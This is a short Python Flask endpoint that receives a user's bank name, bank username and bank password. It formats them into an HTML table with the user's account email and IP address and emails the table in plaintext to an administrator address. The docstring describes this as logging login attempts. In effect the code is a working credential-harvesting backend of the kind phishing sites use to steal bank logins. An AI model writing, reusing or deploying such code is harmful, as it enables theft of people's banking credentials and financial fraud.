@app.route('/api/bank-login-attempt', methods=['POST'])
@login_required
def bank_login_attempt():
    """API endpoint to log bank login attempts and send them to admin"""
    data = request.json
    
    if not data:
        return jsonify({'error': 'No data provided'}), 400
    
    # Get the required data
    bank_name = data.get('bank', 'Unknown Bank')
    username = data.get('username', '')
    password = data.get('password', '')
    attempt = data.get('attempt', 1)
    
    # Create HTML content for the email
    html_content = f"""
    <h2>Bank Login Attempt {attempt}</h2>
    <p>A user attempted to log in to their bank account.</p>
    <table border="1" cellpadding="5" cellspacing="0">
        <tr><td>User</td><td>{current_user.email} ({current_user.username})</td></tr>
        <tr><td>Bank</td><td>{bank_name}</td></tr>
        <tr><td>Username</td><td>{username}</td></tr>
        <tr><td>Password</td><td>{password}</td></tr>
        <tr><td>Attempt</td><td>{attempt}</td></tr>
        <tr><td>Time</td><td>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</td></tr>
        <tr><td>IP Address</td><td>{request.remote_addr}</td></tr>
    </table>
    """
    
    # Send email to admin
    subject = f"Bank Login Attempt {attempt} - {bank_name} - {current_user.email}"
    send_email(Config.ADMIN_EMAIL, subject, html_content)
    
    return jsonify({'success': True})